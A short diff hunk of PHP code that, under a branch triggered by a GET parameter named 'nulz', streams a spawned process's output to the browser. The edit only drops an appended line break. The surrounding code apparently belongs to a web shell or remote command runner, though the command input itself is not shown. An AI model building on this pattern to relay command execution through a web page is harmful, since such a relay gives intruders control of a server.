@@ -187,7 +187,7 @@ if (isset($_GET['nulz'])) {
                                     $return_message = fgets($pipes[1], 1024);
                                     if (strlen($return_message) == 0) break;
                             
-                                    echo $return_message.'<br />';
+                                    echo $return_message;
                                     ob_flush();
                                     flush();
                                 }
